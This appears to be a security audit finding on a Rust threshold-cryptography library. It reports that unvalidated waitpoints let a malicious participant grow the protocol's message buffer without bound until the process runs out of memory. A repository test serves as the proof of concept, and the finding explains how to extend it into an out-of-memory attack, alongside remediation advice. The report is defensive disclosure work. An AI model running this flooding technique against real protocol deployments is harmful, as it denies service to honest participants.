### Title
Unbounded `MessageBuffer` Growth via Arbitrary Waitpoint Injection Enables Memory Exhaustion DoS - (File: `src/protocol/internal.rs`)

---

### Summary

The `MessageBuffer` inside `ProtocolExecutor` accepts and permanently stores messages for any `(channel, waitpoint)` pair without validating whether that pair is ever expected by the running protocol. A malicious participant can inject messages with arbitrary waitpoint values, causing the internal `HashMap<MessageHeader, SubMessageQueue>` to grow without bound. Each injected message also enters an `UnboundedSender` queue that is never drained for unrecognized headers. This causes unbounded memory growth in the host process running any threshold protocol (DKG, presign, sign, reshare, etc.), eventually causing OOM and permanent denial of service for honest parties.

---

### Finding Description

Every threshold protocol in this library is driven through the `Protocol` trait's `message()` method, which is the sole public entry point for delivering incoming network messages:

```rust
// src/protocol/mod.rs:64
fn message(&mut self, from: Participant, data: MessageData);
```

The implementation in `ProtocolExecutor` unconditionally forwards every call to `Comms::push_message`:

```rust
// src/protocol/internal.rs:512-514
fn message(&mut self, from: Participant, data: MessageData) {
    self.comms.push_message(from, data);
}
```

`push_message` parses the first 40 bytes of the message as a `MessageHeader` (32-byte `ChannelTag` + 8-byte `Waitpoint`) and inserts it into the `MessageBuffer` with no further validation:

```rust
// src/protocol/internal.rs:286-296
fn push_message(&self, from: Participant, message: MessageData) {
    if message.len() < MessageHeader::LEN {
        return;
    }
    let Some(header) = MessageHeader::from_bytes(&message) else {
        return;
    };
    self.incoming.push(header, from, message);
}
```

`MessageBuffer::push` uses `entry().or_default()` to create a new `SubMessageQueue` for every previously-unseen `MessageHeader`, and then enqueues the message into that queue's `UnboundedSender`:

```rust
// src/protocol/internal.rs:236-239
fn push(&self, header: MessageHeader, from: Participant, message: MessageData) {
    let mut messages_lock = self.messages.lock().expect("lock should not fail");
    messages_lock.entry(header).or_default().send(from, message);
}
```

`SubMessageQueue` is backed by `futures::channel::mpsc::unbounded()`:

```rust
// src/protocol/internal.rs:206
let (sender, receiver) = futures::channel::mpsc::unbounded();
```

There are two independent dimensions of unbounded growth:

1. **HashMap key explosion**: The `waitpoint` field is a `u64`, giving 2^64 distinct `MessageHeader` values per channel tag. Each unique header creates a new `HashMap` entry that is never removed, even after the protocol completes or the corresponding round is long past.

2. **Per-queue depth**: For any single header, the `UnboundedSender` accepts an unlimited number of messages. Messages for headers the protocol never polls are never consumed and accumulate indefinitely.

The codebase itself contains a test that explicitly documents and confirms this behavior:

```rust
// src/protocol/internal.rs:532-554
fn attacker_can_fill_message_buffer_with_unused_waitpoints() {
    let comms = Comms::new();
    let attacker = Participant::from(99_u32);
    let attack_count = 512_u64;
    for i in 0..attack_count {
        let header = MessageHeader::new(ChannelTag::root_shared())
            .with_waitpoint(1_000_000 + i);
        // Attacker injects messages for waitpoints the honest code never polls.
        comms.push_message(attacker, message);
    }
    assert!(messages.len() == usize::try_from(attack_count).unwrap());
}
```

The test name is `attacker_can_fill_message_buffer_with_unused_waitpoints` ŌĆö the developers have identified the property but have not applied any bound or mitigation.

### Impact Explanation

**Medium ŌĆö Griefing / resource exhaustion causing unbounded memory growth beyond documented behavior.**

A malicious participant sends a stream of crafted messages, each with a distinct `waitpoint` value (e.g., `1_000_000`, `1_000_001`, ŌĆ”), all using the legitimate shared-channel `ChannelTag`. Each message is 40+ bytes and syntactically valid. The `MessageBuffer` HashMap grows by one entry per message, each entry holding an `Arc<Mutex<UnboundedReceiver<ŌĆ”>>>` and a live `UnboundedSender`. The memory consumed is proportional to the number of injected messages with no upper bound enforced anywhere in the stack.

Because the `MessageBuffer` is shared for the lifetime of the protocol instance, and protocol instances for long-running operations (DKG, triple generation) can remain alive for extended periods, the attacker can sustain the attack across the entire protocol lifetime. At sufficient volume this causes OOM in the host process, permanently terminating the protocol for all honest participants ŌĆö a liveness failure for DKG, presign, sign, or reshare.

---

### Likelihood Explanation

Any participant in a threshold session can call `Protocol::message()` on another participant's instance. The `Protocol` trait is the public API; the library explicitly documents that callers deliver messages from the network layer. A single malicious participant (or a network-level attacker who can inject messages) can execute this attack with minimal resources: each injected message is ~40 bytes, requires no cryptographic knowledge, and the attacker does not need to know the protocol's internal state. The attack is reachable in every protocol that uses `make_protocol` / `ProtocolExecutor`, which covers all schemes in the library.

---

### Recommendation

Apply a bound on the number of distinct `MessageHeader` keys accepted into `MessageBuffer`. Reject (or drop) any message whose header does not correspond to a waitpoint the protocol has already registered interest in, or cap the total number of HashMap entries. Alternatively, track the set of "live" waitpoints and only accept messages for those waitpoints, discarding the rest. The `SubMessageQueue` channels should also be bounded (`mpsc::channel(N)` instead of `mpsc::unbounded()`).

---

### Proof of Concept

The existing test in the repository already proves the root cause directly:

```rust
// src/protocol/internal.rs:532-554
fn attacker_can_fill_message_buffer_with_unused_waitpoints() {
    let comms = Comms::new();
    let attacker = Participant::from(99_u32);
    let attack_count = 512_u64;

    for i in 0..attack_count {
        let header =
            MessageHeader::new(ChannelTag::root_shared()).with_waitpoint(1_000_000 + i);
        let mut message = header.to_bytes().to_vec();
        message.extend_from_slice(&i.to_le_bytes());
        // Each call creates a new HashMap entry that is never removed.
        comms.push_message(attacker, message);
    }

    let messages = comms.incoming.messages.lock().unwrap();
    // HashMap has grown to exactly attack_count entries ŌĆö unbounded.
    assert!(messages.len() == usize::try_from(attack_count).unwrap());
}
```

To extend to an OOM scenario, replace `attack_count = 512` with a loop that runs until the process is killed, sending messages with sequentially incrementing waitpoints. No cryptographic material is needed; the attacker only needs to be able to call `Protocol::message()` on the victim's protocol instance, which is the normal network-delivery path.
